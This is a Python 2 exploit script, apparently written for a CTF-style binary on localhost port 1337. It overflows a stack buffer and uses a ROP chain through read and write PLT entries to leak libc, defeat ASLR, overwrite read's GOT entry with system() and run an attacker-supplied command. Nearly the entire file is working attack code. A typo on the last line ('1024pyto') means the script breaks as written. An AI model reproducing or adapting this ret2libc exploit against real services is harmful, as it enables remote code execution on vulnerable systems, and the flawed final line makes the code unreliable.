import os, sys, socket
import struct

# address of system = address of read - read offset + system offset
# address of read@plt 0804832c
# address of wrtie@plt 0804830c

addr = ('127.0.0.1', 1337)

cmd = sys.argv[1] + "\0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "A"* 140



# write stdin to .dynamic using read@plt

# 0x080484b7 ppr
payload += struct.pack("<I", 0x0804832c) # read 
payload += struct.pack("<I", 0x080484b6) # pppr
payload += struct.pack("<I", 0) #stdin
payload += struct.pack("<I", 0x08049530) #addr of .dynamic
payload += struct.pack("<I", len(cmd))
#expects i/p at stdin

# leak address of randomized libc

payload += struct.pack("<I", 0x0804830c) # write 
payload += struct.pack("<I", 0x080484b6) # pppr
payload += struct.pack("<I", 1) #stdout
payload += struct.pack("<I" , 0x0804961c) # read's entry in got
payload += struct.pack("<I", 4) #no of bytes to write
# this gives us output at stdoutput

# call read@plt to overwrite the ptr in read's GOT
payload += struct.pack("<I", 0x0804832c) # read 
payload += struct.pack("<I", 0x080484b6) # pppr
payload += struct.pack("<I", 0) #stdin
payload += struct.pack("<I" , 0x0804961c) # read's entry in got
payload += struct.pack("<I", 4) #no of bytes to read


# call read@plt which is actually address of system
payload += struct.pack("<I", 0x0804832c) # read 
payload += "8888" #bogus return addr
payload += struct.pack("<I", 0x08049530) #addr of .dynamic

s.connect(addr)
s.send(payload)

# read offset 000d4350
# system offset 0003a940
libc_read_offset = 0x000d4350
libc_system_offset = 0x0003a940


s.send(cmd)

#calculate system() and send back

readaddr = struct.unpack("<I", s.recv(1024))[0]
print "libc read() addr found at 0x%.8x"  % readaddr

systemaddr = readaddr - libc_read_offset + libc_system_offset

print "libc system() addr found at 0x%.8x"  % systemaddr

s.send(struct.pack("<I", systemaddr))

print s.recv(1024pyto)

s.close()